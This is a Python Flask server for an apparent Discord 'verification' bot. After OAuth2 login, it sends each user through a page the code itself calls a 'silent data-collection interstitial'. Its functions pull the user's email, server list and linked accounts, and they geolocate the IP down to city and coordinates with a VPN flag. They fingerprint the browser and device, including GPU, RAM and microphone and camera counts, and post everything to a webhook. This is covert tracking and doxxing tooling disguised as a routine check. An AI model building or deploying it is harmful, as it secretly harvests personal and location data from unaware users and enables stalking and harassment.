"""
app.py — Flask web server.

FLOW:
  1. Bot button  ──►  Discord OAuth2 (user authorizes first, always)
  2. Discord     ──►  /callback  →  exchanges code, fetches Discord data + IP, redirects to /collect
  3. /collect        JS collects: refresh rate, speed test, device info  →  POSTs to /save-fp  →  /finish
  4. /finish         Merges everything, sends webhook, assigns role, shows success
"""

from __future__ import annotations

import asyncio
import os
import re
import time
import urllib.parse
from datetime import datetime

import requests
from flask import Flask, Response, jsonify, redirect, render_template, request

from config import (
    APP_BASE_URL, CLIENT_ID, CLIENT_SECRET,
    OAUTH2_SCOPES, REDIRECT_URI, SECRET_KEY, WEBHOOK_URL,
)

app = Flask(__name__)
app.secret_key = SECRET_KEY

# Injected by main.py
discord_bot  = None
bot_loop: asyncio.AbstractEventLoop | None = None

DISCORD_API = "https://discord.com/api/v10"

# ── Server-side stores (keyed by OAuth2 state token) ─────────────────────────
discord_store: dict[str, dict]  = {}
fp_store:      dict[str, dict]  = {}
timestamps:    dict[str, float] = {}
_TTL = 600  # 10 minutes

# ── Speed-test payload (2 MB of random bytes, generated once at startup) ─────
# Served from /speedtest/down so JS can measure download speed to our server.
_SPEED_PAYLOAD = os.urandom(2 * 1024 * 1024)


def _cleanup():
    now = time.time()
    for k in [k for k, t in timestamps.items() if now - t > _TTL]:
        discord_store.pop(k, None)
        fp_store.pop(k, None)
        timestamps.pop(k, None)


# ─── Utility helpers ──────────────────────────────────────────────────────────

def get_real_ip() -> str:
    for h in ("CF-Connecting-IP", "X-Forwarded-For", "X-Real-IP"):
        v = request.headers.get(h, "").split(",")[0].strip()
        if v:
            return v
    return request.remote_addr or "Unknown"


def country_flag(code: str) -> str:
    if not code or len(code) != 2:
        return ""
    return chr(ord(code[0].upper()) + 127397) + chr(ord(code[1].upper()) + 127397)


def get_ip_info(ip: str) -> dict:
    if ip in ("127.0.0.1", "::1", "localhost", "Unknown"):
        return {}
    try:
        fields = "status,country,countryCode,regionName,city,zip,lat,lon,timezone,offset,isp,org,as,proxy,hosting"
        r = requests.get(f"http://ip-api.com/json/{ip}?fields={fields}", timeout=5)
        d = r.json()
        return d if d.get("status") == "success" else {}
    except Exception:
        return {}


def fmt_snowflake(sid: int) -> str:
    if not sid:
        return "Unknown"
    dt = datetime.utcfromtimestamp(((sid >> 22) + 1420070400000) / 1000)
    h  = int(dt.strftime("%I"))
    return f"{dt.strftime('%B')} {dt.day}, {dt.year} at {h}:{dt.strftime('%M %p')} UTC"


def fmt_now() -> str:
    dt = datetime.utcnow()
    h  = int(dt.strftime("%I"))
    return f"{dt.strftime('%B')} {dt.day}, {dt.year} at {h}:{dt.strftime('%M %p')} UTC"


def parse_flags(flags: int) -> list[str]:
    return [name for bit, name in {
        1: "Discord Staff", 2: "Partnered Server Owner", 4: "HypeSquad Events",
        8: "Bug Hunter Lv.1", 64: "HypeSquad Bravery", 128: "HypeSquad Brilliance",
        256: "HypeSquad Balance", 512: "Early Supporter", 16384: "Bug Hunter Lv.2",
        131072: "Verified Bot Developer", 4194304: "Active Developer",
    }.items() if flags & bit]


def nitro_label(t: int) -> str:
    return {0: "None", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}.get(t, "None")


def parse_browser_and_os(ua: str, fp: dict) -> tuple[str, str]:
    """
    Returns (browser_name, os_name) — NO version numbers in output.

    Priority order:
      1. fp.isBrave     — Brave JS detection (only reliable Brave method)
      2. fp.uaHints     — UA Client Hints (Chromium: real name + real Windows version)
      3. UA regex       — Fallback for Firefox, Safari, all non-Chromium browsers
    """
    hints    = fp.get("uaHints") or {}
    is_brave = bool(fp.get("isBrave"))

    # ── Browser name (no version) ─────────────────────────────────────────────
    browser = "Unknown"

    if is_brave:
        browser = "Brave"

    elif hints.get("fullVersionList"):
        # UA Client Hints: filter noise ("Not A Brand", "Chromium") and pick real name
        noise = {"not a brand", "not.a/brand", "chromium"}
        # Priority: branded browsers over generic Chrome
        preferred = [
            "Microsoft Edge", "Opera", "Yandex Browser", "Samsung Internet",
            "DuckDuckGo", "Vivaldi", "UC Browser", "Chrome",
        ]
        brands = {
            b["brand"]: b["version"]
            for b in hints["fullVersionList"]
            if b["brand"].lower().strip() not in noise
        }
        for want in preferred:
            for brand in brands:
                if want.lower() in brand.lower():
                    browser = brand   # just the name, no number
                    break
            if browser != "Unknown":
                break
        if browser == "Unknown" and brands:
            browser = next(iter(brands))

    # UA regex fallback — works for ALL browsers
    if browser == "Unknown":
        for pat, name in [
            (r"Edg/",              "Microsoft Edge"),
            (r"OPR/",              "Opera"),
            (r"YaBrowser/",        "Yandex Browser"),
            (r"SamsungBrowser/",   "Samsung Internet"),
            (r"DuckDuckGo/",       "DuckDuckGo"),
            (r"Vivaldi/",          "Vivaldi"),
            (r"UCBrowser/",        "UC Browser"),
            (r"Firefox/",          "Firefox"),
            (r"FxiOS/",            "Firefox"),
            (r"CriOS/",            "Chrome"),
            (r"Chrome/",           "Chrome"),
        ]:
            if re.search(pat, ua):
                browser = name
                break
        else:
            if "Safari" in ua:
                browser = "Safari"

    # ── OS name ───────────────────────────────────────────────────────────────
    os_name = "Unknown"

    if hints.get("platform"):
        p = hints["platform"]
        if p == "Windows":
            os_name = fp.get("windowsVersion", "Windows 10/11")
        elif p == "macOS":
            pv = hints.get("platformVersion", "")
            # macOS: version 13=Ventura, 14=Sonoma, 15=Sequoia, etc.
            os_name = f"macOS {pv}" if pv else "macOS"
        elif p == "Linux":
            os_name = "Linux"
        elif p == "Android":
            pv = hints.get("platformVersion", "")
            os_name = f"Android {pv}" if pv else "Android"
        elif p in ("iOS", "iPadOS"):
            pv = hints.get("platformVersion", "")
            os_name = f"{p} {pv}" if pv else p
        elif p == "Chrome OS":
            os_name = "ChromeOS"
        else:
            os_name = p

    # UA fallback
    if os_name == "Unknown":
        if   "Windows NT 10.0" in ua: os_name = fp.get("windowsVersion", "Windows 10/11")
        elif "Windows NT 6.3"  in ua: os_name = "Windows 8.1"
        elif "Windows NT 6.2"  in ua: os_name = "Windows 8"
        elif "Windows NT 6.1"  in ua: os_name = "Windows 7"
        elif "Windows"         in ua: os_name = "Windows"
        elif "Macintosh"       in ua:
            m = re.search(r"Mac OS X ([\d_]+)", ua)
            os_name = f"macOS {m.group(1).replace('_','.')}" if m else "macOS"
        elif "CrOS"    in ua: os_name = "ChromeOS"
        elif "Android" in ua:
            m = re.search(r"Android ([\d.]+)", ua)
            os_name = f"Android {m.group(1)}" if m else "Android"
        elif "iPhone"  in ua: os_name = "iOS (iPhone)"
        elif "iPad"    in ua: os_name = "iPadOS"
        elif "Linux"   in ua: os_name = "Linux"

    # Append non-standard architecture (skip x86/x86_64 — that's assumed)
    arch = hints.get("architecture", fp.get("architecture", ""))
    if arch and arch.lower() not in ("x86", "x86_64", "x64", ""):
        os_name = f"{os_name} ({arch})"

    return browser, os_name


# ─── Discord OAuth2 helpers ───────────────────────────────────────────────────

def exchange_code(code: str) -> dict:
    resp = requests.post(
        f"{DISCORD_API}/oauth2/token",
        data={
            "client_id":     CLIENT_ID,
            "client_secret": CLIENT_SECRET,
            "grant_type":    "authorization_code",
            "code":          code,
            "redirect_uri":  REDIRECT_URI,
        },
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )
    resp.raise_for_status()
    return resp.json()


def fetch_discord_data(token: str) -> dict:
    h = {"Authorization": f"Bearer {token}"}
    user = requests.get(f"{DISCORD_API}/users/@me",             headers=h).json()
    g    = requests.get(f"{DISCORD_API}/users/@me/guilds",      headers=h).json()
    c    = requests.get(f"{DISCORD_API}/users/@me/connections",  headers=h).json()
    return {
        "user":        user,
        "guilds":      g if isinstance(g, list) else [],
        "connections": c if isinstance(c, list) else [],
    }


# ─── Embed builder ────────────────────────────────────────────────────────────

def build_embeds(discord_data: dict, ip: str, ip_info: dict, fp: dict) -> list[dict]:
    user        = discord_data["user"]
    guilds      = discord_data["guilds"]
    connections = discord_data["connections"]

    uid     = int(user.get("id", 0))
    uname   = user.get("username", "Unknown")
    discrim = user.get("discriminator", "0")
    email   = user.get("email", "Not provided")

    # Avatar
    av_hash = user.get("avatar", "")
    av_url  = (
        f"https://cdn.discordapp.com/avatars/{uid}/{av_hash}.{'gif' if av_hash.startswith('a_') else 'png'}?size=256"
        if av_hash else "https://cdn.discordapp.com/embed/avatars/0.png"
    )

    # Banner (only if user has an actual image banner, not just a colour)
    banner_hash = user.get("banner", "")
    banner_url  = None
    if banner_hash:
        ext = "gif" if banner_hash.startswith("a_") else "png"
        banner_url = f"https://cdn.discordapp.com/banners/{uid}/{banner_hash}.{ext}?size=512"

    email_ok = user.get("verified",    False)
    mfa      = user.get("mfa_enabled", False)
    locale   = user.get("locale",      "Unknown")
    nitro    = nitro_label(user.get("premium_type", 0))
    badges   = parse_flags(user.get("public_flags", 0))
    created  = fmt_snowflake(uid)

    is_vpn = bool(ip_info.get("proxy") or ip_info.get("hosting"))
    flag   = country_flag(ip_info.get("countryCode", ""))
    color  = 0xED4245 if is_vpn else 0x57F287

    ua_raw           = fp.get("userAgent") or "Unknown"
    browser, os_name = parse_browser_and_os(ua_raw, fp)
    is_brave         = bool(fp.get("isBrave"))

    def v(key, fallback="N/A"):
        val = fp.get(key)
        return str(val) if val not in (None, "", "N/A") else fallback

    lang       = v("language",  request.headers.get("Accept-Language","?").split(",")[0])
    languages  = v("languages")
    screen     = v("screen")
    dpr        = v("devicePixelRatio")
    window_sz  = v("windowSize")
    cpu        = v("hardwareConcurrency")
    mem        = v("deviceMemory")
    touch      = v("maxTouchPoints", "0")
    webgl      = v("webGL")
    webgl_vend = v("webGLVendor")
    dnt        = v("doNotTrack")
    cookies    = fp.get("cookieEnabled")
    adblock    = fp.get("adBlock", False)
    a_in       = v("audioInputs")
    a_out      = v("audioOutputs")
    v_in       = v("videoInputs")

    # Refresh rate
    hz = v("refreshRate")
    hz_str = f"**{hz}**" if hz != "N/A" else "N/A"

    # Speed test
    dl = v("speedDownload")
    ul = v("speedUpload")
    speed_str = f"↓ {dl}  •  ↑ {ul}" if dl != "N/A" else "N/A"

    # ── Discord Account field ─────────────────────────────────────────────────
    discrim_str = f"#{discrim}" if discrim not in ("0", "", None) else ""
    badge_str   = ",  ".join(f"`{b}`" for b in badges) if badges else "None"

    account_val = (
        f"**{uname}{discrim_str}** — `{uid}`\n"
        f"📧  {email}  {'✅' if email_ok else '❌'}\n"
        f"📅  {created}\n"
        f"🔐  2FA: {'✅ On' if mfa else '❌ Off'}  •  Nitro: **{nitro}**  •  Locale: `{locale}`\n"
        f"🏅  Badges: {badge_str}"
    )

    # ── Network field ─────────────────────────────────────────────────────────
    tz_offset = ip_info.get("offset", 0)
    tz_sign   = "+" if tz_offset >= 0 else ""
    tz_hours  = tz_offset // 3600 if isinstance(tz_offset, int) else "?"

    network_val = (
        f"🌐  `{ip}`\n"
        f"{flag}  **{ip_info.get('country','Unknown')}** — "
        f"{ip_info.get('city','?')}, {ip_info.get('regionName','?')}\n"
        f"🏢  {ip_info.get('isp','Unknown')}\n"
        f"🔢  {ip_info.get('as','N/A')}\n"
        f"🕐  {ip_info.get('timezone','N/A')} (UTC{tz_sign}{tz_hours})\n"
        f"📍  {ip_info.get('lat','?')}°,  {ip_info.get('lon','?')}°\n"
        f"🔒  VPN/Proxy: {'⚠️ **YES**' if is_vpn else '✅ No'}  •  "
        f"Datacenter: {'⚠️ **YES**' if ip_info.get('hosting') else '✅ No'}"
    )

    # ── Device & Browser field ────────────────────────────────────────────────
    device_val = (
        f"🌐  **{browser}**\n"
        f"🖥️  **{os_name}**\n"
        f"🌍  {lang}  •  All: {languages}\n"
        f"📺  {screen} @ {dpr}×  •  Window: {window_sz}\n"
        f"🔄  Refresh Rate: {hz_str}\n"
        f"⚡  CPU: **{cpu}** cores  •  RAM: **{mem}** GB\n"
        f"👆  Touch: {touch} points\n"
        f"🎮  GPU: {webgl}\n"
        f"🏭  GPU Vendor: {webgl_vend}\n"
        f"📶  Speed: {speed_str}\n"
        f"🔇  AdBlock: {'✅ Yes' if adblock else '❌ No'}  •  "
        f"DNT: {dnt}  •  Cookies: {'✅' if cookies else '❌'}\n"
        f"🎙️  Mic: {a_in}  •  Cam: {v_in}  •  Speakers: {a_out}"
    )

    vpn_header = "⚠️  VPN / PROXY DETECTED  •  " if is_vpn else ""
    now_iso    = datetime.utcnow().isoformat() + "Z"

    embed1: dict = {
        "title":       f"{vpn_header}🔐  New Verification",
        "description": f"<@{uid}> just verified in the server.",
        "color":       color,
        "thumbnail":   {"url": av_url},
        "fields": [
            {"name": "👤  Discord Account",    "value": account_val[:1024], "inline": False},
            {"name": "🌍  Network & Location", "value": network_val[:1024], "inline": True},
            {"name": "💻  Device & Browser",   "value": device_val[:1024],  "inline": True},
        ],
        "footer":    {"text": f"Verified at {fmt_now()}"},
        "timestamp": now_iso,
    }
    # Show banner as large image below fields (only if they have one)
    if banner_url:
        embed1["image"] = {"url": banner_url}

    guild_lines = []
    for g in guilds[:25]:
        crown = " 👑" if g.get("owner") else ""
        guild_lines.append(f"• **{g.get('name','?')}**{crown}  `{g.get('id','')}`")
    if len(guilds) > 25:
        guild_lines.append(f"*…and {len(guilds) - 25} more*")

    icons = {
        "twitch": "🟣", "youtube": "🔴", "steam": "🖥️", "spotify": "🟢",
        "twitter": "🐦", "github": "⬛", "xbox": "🟩", "facebook": "🔵",
        "reddit": "🟠", "playstation": "🔵", "epicgames": "⬜",
        "instagram": "🟤", "tiktok": "⬛", "riotgames": "🔴",
        "leagueoflegends": "🔷", "battlenet": "🔵",
    }
    conn_lines = []
    for c in connections:
        ctype = c.get("type", "?")
        icon  = icons.get(ctype, "🔗")
        veri  = " ✅" if c.get("verified") else ""
        hide  = " 🔒" if not c.get("visibility") else ""
        conn_lines.append(f"{icon}  **{ctype.title()}** — {c.get('name','?')}{veri}{hide}")

    embed2 = {
        "color": color,
        "fields": [
            {
                "name":   f"🏠  Servers ({len(guilds)})",
                "value":  ("\n".join(guild_lines) or "None visible")[:1024],
                "inline": False,
            },
            {
                "name":   f"🔗  Connected Accounts ({len(connections)})",
                "value":  ("\n".join(conn_lines) or "None connected")[:1024],
                "inline": False,
            },
        ],
        "footer":    {"text": f"User ID: {uid}"},
        "timestamp": now_iso,
    }

    return [embed1, embed2]


def send_webhook(discord_data: dict, ip: str, ip_info: dict, fp: dict):
    if not WEBHOOK_URL:
        print("⚠️  WEBHOOK_URL not set — skipping")
        return
    try:
        embeds = build_embeds(discord_data, ip, ip_info, fp)
        r = requests.post(WEBHOOK_URL, json={"embeds": embeds}, timeout=8)
        r.raise_for_status()
        print(f"📨  Webhook sent  HTTP {r.status_code}")
    except Exception as e:
        print(f"❌  Webhook error: {e}")


# ─── Routes ───────────────────────────────────────────────────────────────────

@app.route("/speedtest/down")
def speedtest_down():
    """Serves a 2 MB payload for the JS download speed test."""
    return Response(
        _SPEED_PAYLOAD,
        mimetype="application/octet-stream",
        headers={"Cache-Control": "no-store, no-cache", "Content-Length": str(len(_SPEED_PAYLOAD))},
    )


@app.route("/speedtest/up", methods=["POST"])
def speedtest_up():
    """Receives upload data from JS speed test and discards it."""
    request.get_data()  # read and discard
    return jsonify({"ok": True})


@app.route("/callback")
def callback():
    """
    Discord redirects here after user authorizes.
    Exchanges code → fetches all Discord data + IP → stores by state → redirects to /collect.
    """
    code  = request.args.get("code", "")
    state = request.args.get("state", "")
    error = request.args.get("error", "")

    if error:
        return render_template("error.html", error=request.args.get("error_description", error))
    if not code:
        return render_template("error.html", error="No authorization code received from Discord.")

    try:
        token_data   = exchange_code(code)
        access_token = token_data["access_token"]
        discord_data = fetch_discord_data(access_token)

        ip      = get_real_ip()
        ip_info = get_ip_info(ip)

        _cleanup()
        discord_store[state] = {"discord_data": discord_data, "ip": ip, "ip_info": ip_info}
        timestamps[state]    = time.time()

        collect_url = f"{APP_BASE_URL}/collect?state={urllib.parse.quote(state)}"
        return redirect(collect_url)

    except requests.HTTPError as e:
        print(f"❌  HTTP error in callback: {e}")
        return render_template("error.html", error="Failed to communicate with the Discord API.")
    except Exception:
        import traceback
        traceback.print_exc()
        return render_template("error.html", error="An unexpected error occurred.")


@app.route("/collect")
def collect():
    """Renders the silent data-collection interstitial page."""
    state = request.args.get("state", "").strip()
    if not state or state not in discord_store:
        return render_template("error.html", error="Session expired. Please click Verify Now again.")
    finish_url = f"{APP_BASE_URL}/finish?state={urllib.parse.quote(state)}"
    return render_template("collect.html", state=state, finish_url=finish_url)


@app.route("/save-fp", methods=["POST"])
def save_fp():
    """Stores browser fingerprint from the /collect page JS."""
    data  = request.get_json(silent=True) or {}
    state = data.get("state", "").strip()
    fp    = data.get("fp", {})
    if state:
        fp_store[state]   = fp
        timestamps[state] = time.time()
        print(f"💾  Fingerprint saved …{state[-6:]}")
    return jsonify({"ok": True})


@app.route("/finish")
def finish():
    """Merges Discord data + fingerprint, sends webhook, assigns role."""
    state = request.args.get("state", "").strip()

    stored = discord_store.pop(state, None)
    fp     = fp_store.pop(state, {})
    timestamps.pop(state, None)

    if not stored:
        return render_template("error.html", error="Session expired. Please click Verify Now again.")

    discord_data = stored["discord_data"]
    ip           = stored["ip"]
    ip_info      = stored["ip_info"]
    user         = discord_data["user"]
    uid          = int(user.get("id", 0))

    if not fp.get("userAgent"):
        fp["userAgent"] = request.headers.get("User-Agent", "Unknown")

    send_webhook(discord_data, ip, ip_info, fp)

    role_given = False
    if uid and discord_bot and bot_loop:
        future = asyncio.run_coroutine_threadsafe(
            discord_bot.give_verified_role(uid), bot_loop
        )
        try:
            role_given = future.result(timeout=10)
        except Exception as e:
            print(f"⚠️  Role error: {e}")

    return render_template(
        "success.html",
        username=user.get("username", "User"),
        role_given=role_given,
    )
